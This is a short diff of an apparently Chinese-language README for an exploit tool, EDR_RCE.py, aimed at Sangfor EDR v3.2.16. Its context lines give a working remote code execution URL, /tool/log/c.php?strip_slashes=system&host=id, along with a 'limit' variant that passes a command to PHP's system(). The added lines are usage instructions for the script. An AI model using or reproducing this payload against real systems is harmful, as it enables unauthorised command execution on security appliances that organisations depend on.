@@ -17,6 +17,12 @@ https://xxx.xxx/tool/log/c.php?strip_slashes=system&host=id
 /tool/log/c.php?strip_slashes=system&limit=id
 ```
 
+## 使用方法
+
+python3 EDR_RCE.py --help
+
+![image-20201109110343499](./img/1.png)
+
 ## 影响范围
 
 - 深信服 EDR v3.2.16
